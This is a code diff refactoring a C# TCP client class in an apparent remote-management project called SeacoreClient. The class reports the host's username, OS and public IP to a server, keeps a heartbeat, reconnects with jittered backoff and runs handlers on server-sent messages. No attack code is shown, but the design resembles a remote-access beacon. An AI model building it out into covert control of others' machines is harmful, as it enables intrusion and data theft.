@@ -1,27 +1,37 @@
-﻿using System.Runtime.InteropServices;
+using System.Buffers;
+using System.IO;
+using System.Net.Http;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Text.Json;
 using System.Text.Json.Serialization;
+using System.Threading;
+using System.Threading.Tasks;
+using MessagePack;
 using SeacoreClient.Handlers;
 using SeacoreCommon.Messages;
-using System.Net.Sockets;
-using System.Text.Json;
-using MessagePack;
 using SeacoreCommon.Utilities;
 
 namespace SeacoreClient.Core
 {
-    public class TcpClientManager
+    public class TcpClientManager : IDisposable
     {
         private static readonly MessagePackSerializerOptions SerializerOptions = SerializerOptionsProvider.Options;
         public HeartbeatConfig HeartbeatConfig { get; set; } = new HeartbeatConfig();
-        private static readonly HttpClient httpClient = new HttpClient();
-        private static readonly Random jitterer = new Random();
+        private static readonly HttpClient httpClient = new();
+        private static readonly Random jitterer = new();
+        private readonly SemaphoreSlim sendLock = new(1, 1);
+        private readonly object connectionLock = new();
+
         private HeartbeatSender? heartbeatSender;
         private bool allowReconnect = true;
         private readonly string serverIp;
         private readonly int serverPort;
         private NetworkStream? stream;
-        private int retryCount = 0;
+        private int retryCount;
         private TcpClient? client;
+        private CancellationTokenSource? runLoopCts;
+        private bool disposed;
 
         public HeartbeatSender? HeartbeatSender => heartbeatSender;
 
@@ -31,68 +41,176 @@ namespace SeacoreClient.Core
             serverPort = port;
         }
 
-        public async Task RunAsync()
+        public async Task RunAsync(CancellationToken cancellationToken = default)
         {
-            while (allowReconnect)
+            ThrowIfDisposed();
+
+            if (runLoopCts != null)
             {
-                try
+                throw new InvalidOperationException("RunAsync has already been called. Invoke Stop before starting again.");
+            }
+
+            allowReconnect = true;
+            runLoopCts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+            var runToken = runLoopCts.Token;
+
+            try
+            {
+                while (allowReconnect && !runToken.IsCancellationRequested)
                 {
-                    client = new TcpClient();
-                    await client.ConnectAsync(serverIp, serverPort);
-                    stream = client.GetStream();
+                    runToken.ThrowIfCancellationRequested();
 
-                    var userName = Environment.UserName;
-                    var osString = DetectClientOS();
-                    var publicIP = await GetPublicIPAsync();
-
-                    var identificationMessage = new ClientIdentificationMessage
+                    try
                     {
-                        Username = userName,
-                        OS = osString,
-                        PublicIP = publicIP
-                    };
-                    SendMessage(identificationMessage);
+                        client = new TcpClient();
+                        await client.ConnectAsync(serverIp, serverPort);
+                        stream = client.GetStream();
 
-                    heartbeatSender = new HeartbeatSender(this, this.HeartbeatConfig);
-                    heartbeatSender.OnHeartbeatFailure += HandleHeartbeatFailure;
-                    heartbeatSender.Start();
-                    Console.WriteLine("Connected to server.");
-                    retryCount = 0;
-                    await ListenForMessagesAsync();
+                        var userName = Environment.UserName;
+                        var osString = DetectClientOS();
+                        var publicIP = await GetPublicIPAsync(runToken);
+
+                        var identificationMessage = new ClientIdentificationMessage
+                        {
+                            Username = userName,
+                            OS = osString,
+                            PublicIP = publicIP
+                        };
+
+                        await SendMessageAsync(identificationMessage, runToken);
+
+                        heartbeatSender = new HeartbeatSender(this, HeartbeatConfig);
+                        heartbeatSender.OnHeartbeatFailure += HandleHeartbeatFailure;
+                        heartbeatSender.Start();
+
+                        Console.WriteLine("Connected to server.");
+                        retryCount = 0;
+
+                        await ListenForMessagesAsync(runToken);
+                    }
+                    catch (OperationCanceledException) when (runToken.IsCancellationRequested)
+                    {
+                        break;
+                    }
+                    catch (Exception ex)
+                    {
+                        if (!allowReconnect || runToken.IsCancellationRequested)
+                        {
+                            break;
+                        }
+
+                        int delay = CalculateDelay(retryCount);
+                        Console.WriteLine($"Connection failed: {ex.Message}. Retrying in {delay / 1000} seconds...");
+                        retryCount++;
+
+                        try
+                        {
+                            await Task.Delay(delay, runToken);
+                        }
+                        catch (OperationCanceledException) when (runToken.IsCancellationRequested)
+                        {
+                            break;
+                        }
+                    }
+                    finally
+                    {
+                        CloseConnection();
+                    }
                 }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"Connection failed: {ex.Message}. Retrying in {CalculateDelay(retryCount) / 1000} seconds...");
-                    int delay = CalculateDelay(retryCount);
-                    await Task.Delay(delay);
-                    retryCount++;
-                }
+            }
+            finally
+            {
+                runLoopCts.Dispose();
+                runLoopCts = null;
             }
         }
 
         private void HandleHeartbeatFailure()
         {
+            if (!allowReconnect)
+            {
+                return;
+            }
+
             Console.WriteLine("Heartbeat failure threshold reached. Initiating reconnection...");
-            InitiateReconnection();
+            RequestReconnect();
         }
 
-        private void InitiateReconnection()
+        public void RequestReconnect()
         {
-            allowReconnect = true;
-            heartbeatSender?.Stop();
-            stream?.Close();
-            client?.Close();
+            ThrowIfDisposed();
+
+            if (!allowReconnect)
+            {
+                return;
+            }
+
+            CloseConnection();
         }
 
-        private async Task<string> GetPublicIPAsync()
+        public void Stop()
+        {
+            allowReconnect = false;
+            CancelRunLoop();
+            CloseConnection();
+        }
+
+        public void Dispose()
+        {
+            if (disposed)
+            {
+                return;
+            }
+
+            Stop();
+            disposed = true;
+            GC.SuppressFinalize(this);
+        }
+
+        private void CancelRunLoop()
+        {
+            var loopCts = runLoopCts;
+            if (loopCts != null && !loopCts.IsCancellationRequested)
+            {
+                loopCts.Cancel();
+            }
+        }
+
+        private void CloseConnection()
+        {
+            lock (connectionLock)
+            {
+                if (heartbeatSender != null)
+                {
+                    heartbeatSender.OnHeartbeatFailure -= HandleHeartbeatFailure;
+                    heartbeatSender.Dispose();
+                    heartbeatSender = null;
+                }
+
+                stream?.Dispose();
+                stream = null;
+
+                if (client != null)
+                {
+                    client.Dispose();
+                    client = null;
+                }
+            }
+        }
+
+        private async Task<string> GetPublicIPAsync(CancellationToken cancellationToken)
         {
             try
             {
-                var response = await httpClient.GetAsync("https://api.ipify.org?format=json");
+                using var response = await httpClient.GetAsync("https://api.ipify.org?format=json", cancellationToken);
                 response.EnsureSuccessStatusCode();
-                var json = await response.Content.ReadAsStringAsync();
+                var json = await response.Content.ReadAsStringAsync(cancellationToken);
                 var ipResponse = JsonSerializer.Deserialize<IpifyResponse>(json);
                 return ipResponse?.Ip ?? "Unknown";
+            }
+            catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
+            {
+                throw;
             }
             catch (Exception ex)
             {
@@ -104,7 +222,7 @@ namespace SeacoreClient.Core
         private class IpifyResponse
         {
             [JsonPropertyName("ip")]
-            public string Ip { get; set; }
+            public string? Ip { get; set; }
         }
 
         private string DetectClientOS()
@@ -136,82 +254,138 @@ namespace SeacoreClient.Core
             return baseDelay + (int)(jitterer.NextDouble() * 2 * jitter - jitter);
         }
 
-        public void SendMessage(MessageBase message)
+        public async Task SendMessageAsync(MessageBase message, CancellationToken cancellationToken = default)
         {
+            if (message is null)
+            {
+                throw new ArgumentNullException(nameof(message));
+            }
+
+            ThrowIfDisposed();
+
+            await sendLock.WaitAsync(cancellationToken);
             try
             {
-                if (stream != null && client?.Connected == true)
+                if (stream == null || client?.Connected != true)
                 {
-                    var bytes = MessagePackSerializer.Serialize(message, SerializerOptions);
-                    var lengthBytes = BitConverter.GetBytes(bytes.Length);
-                    if (BitConverter.IsLittleEndian)
-                        Array.Reverse(lengthBytes);
-                    stream.Write(lengthBytes, 0, lengthBytes.Length);
-                    stream.Write(bytes, 0, bytes.Length);
+                    throw new InvalidOperationException("Cannot send message because the client is not connected.");
                 }
+
+                var bytes = MessagePackSerializer.Serialize(message, SerializerOptions);
+                var lengthBytes = BitConverter.GetBytes(bytes.Length);
+                if (BitConverter.IsLittleEndian)
+                {
+                    Array.Reverse(lengthBytes);
+                }
+
+                await stream.WriteAsync(lengthBytes.AsMemory(0, lengthBytes.Length), cancellationToken);
+                await stream.WriteAsync(bytes.AsMemory(0, bytes.Length), cancellationToken);
+            }
+            catch (OperationCanceledException)
+            {
+                throw;
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Exception in SendMessage: {ex.Message}");
+                Console.WriteLine($"Exception in SendMessageAsync: {ex.Message}");
+                throw;
+            }
+            finally
+            {
+                sendLock.Release();
             }
         }
 
-        private async Task ListenForMessagesAsync()
+        private async Task ListenForMessagesAsync(CancellationToken cancellationToken)
         {
+            if (stream == null)
+            {
+                return;
+            }
+
             try
             {
-                while (client?.Connected == true)
+                while (!cancellationToken.IsCancellationRequested && client?.Connected == true)
                 {
-                    byte[] lengthBytes = new byte[4];
-                    int bytesRead = await stream.ReadAsync(lengthBytes, 0, 4);
-                    if (bytesRead < 4)
-                    {
-                        Console.WriteLine("Disconnected: Incomplete length prefix received.");
-                        break;
-                    }
+                    cancellationToken.ThrowIfCancellationRequested();
 
-                    if (BitConverter.IsLittleEndian)
-                        Array.Reverse(lengthBytes);
-                    int messageLength = BitConverter.ToInt32(lengthBytes, 0);
-
-                    if (messageLength <= 0 || messageLength > Utility.MAX_MESSAGE_SIZE)
-                    {
-                        Console.WriteLine($"Invalid or oversized message length received: {messageLength}");
-                        break;
-                    }
-
-                    byte[] messageBytes = new byte[messageLength];
-                    int totalBytesRead = 0;
-                    while (totalBytesRead < messageLength)
-                    {
-                        int read = await stream.ReadAsync(messageBytes, totalBytesRead, messageLength - totalBytesRead);
-                        if (read == 0)
-                        {
-                            Console.WriteLine("Disconnected: Incomplete message received.");
-                            break;
-                        }
-                        totalBytesRead += read;
-                    }
-
-                    if (totalBytesRead < messageLength)
-                    {
-                        Console.WriteLine("Disconnected: Incomplete message received after reading.");
-                        break;
-                    }
-
-                    Console.WriteLine($"Received message bytes: {BitConverter.ToString(messageBytes)}");
-
+                    byte[] lengthBuffer = ArrayPool<byte>.Shared.Rent(4);
                     try
                     {
-                        var message = MessagePackSerializer.Deserialize<MessageBase>(messageBytes, SerializerOptions);
-                        Console.WriteLine($"Received message of type: {message.GetType().Name}");
-                        MessageHandler.ProcessMessage(message, this);
+                        int bytesRead = await stream.ReadAsync(lengthBuffer.AsMemory(0, 4), cancellationToken);
+                        if (bytesRead < 4)
+                        {
+                            Console.WriteLine("Disconnected: Incomplete length prefix received.");
+                            break;
+                        }
+
+                        if (BitConverter.IsLittleEndian)
+                        {
+                            Array.Reverse(lengthBuffer, 0, 4);
+                        }
+
+                        int messageLength = BitConverter.ToInt32(lengthBuffer, 0);
+                        if (messageLength <= 0 || messageLength > Utility.MAX_MESSAGE_SIZE)
+                        {
+                            Console.WriteLine($"Invalid or oversized message length received: {messageLength}");
+                            break;
+                        }
+
+                        byte[] messageBuffer = ArrayPool<byte>.Shared.Rent(messageLength);
+                        try
+                        {
+                            int totalBytesRead = 0;
+                            while (totalBytesRead < messageLength)
+                            {
+                                int read = await stream.ReadAsync(messageBuffer.AsMemory(totalBytesRead, messageLength - totalBytesRead), cancellationToken);
+                                if (read == 0)
+                                {
+                                    Console.WriteLine("Disconnected: Incomplete message received.");
+                                    break;
+                                }
+
+                                totalBytesRead += read;
+                            }
+
+                            if (totalBytesRead < messageLength)
+                            {
+                                Console.WriteLine("Disconnected: Incomplete message received after reading.");
+                                break;
+                            }
+
+                            try
+                            {
+                                var message = MessagePackSerializer.Deserialize<MessageBase>(messageBuffer.AsMemory(0, messageLength), SerializerOptions);
+                                Console.WriteLine($"Received message of type: {message.GetType().Name}");
+
+                                try
+                                {
+                                    MessageHandler.ProcessMessage(message, this);
+                                }
+                                catch (Exception handlerEx)
+                                {
+                                    Console.WriteLine($"Error processing message: {handlerEx.Message}");
+                                }
+                            }
+                            catch (MessagePackSerializationException ex)
+                            {
+                                Console.WriteLine($"Deserialization error: {ex.Message}");
+                            }
+                        }
+                        finally
+                        {
+                            ArrayPool<byte>.Shared.Return(messageBuffer);
+                        }
                     }
-                    catch (MessagePackSerializationException ex)
+                    finally
                     {
-                        Console.WriteLine($"Deserialization error: {ex.Message}");
+                        ArrayPool<byte>.Shared.Return(lengthBuffer);
                     }
                 }
+            }
+            catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
+            {
+                // graceful shutdown
             }
             catch (IOException ioEx) when (ioEx.InnerException is SocketException socketEx && socketEx.SocketErrorCode == SocketError.ConnectionReset)
             {
@@ -221,25 +395,31 @@ namespace SeacoreClient.Core
             {
                 Console.WriteLine($"Socket error occurred: {sockEx.Message}. Attempting to reconnect...");
             }
+            catch (ObjectDisposedException)
+            {
+                if (!cancellationToken.IsCancellationRequested && allowReconnect)
+                {
+                    Console.WriteLine("Connection closed. Attempting to reconnect...");
+                }
+            }
             catch (Exception ex)
             {
                 Console.WriteLine($"An unexpected error occurred: {ex.Message}. Attempting to reconnect...");
-            }
-            finally
-            {
-                heartbeatSender?.Stop();
-                stream?.Close();
-                client?.Close();
             }
         }
 
         public void HandleServerInitiatedDisconnect()
         {
             Console.WriteLine("Server initiated disconnect.");
-            allowReconnect = false;
-            heartbeatSender?.Stop();
-            stream?.Close();
-            client?.Close();
+            Stop();
+        }
+
+        private void ThrowIfDisposed()
+        {
+            if (disposed)
+            {
+                throw new ObjectDisposedException(nameof(TcpClientManager));
+            }
         }
     }
 }
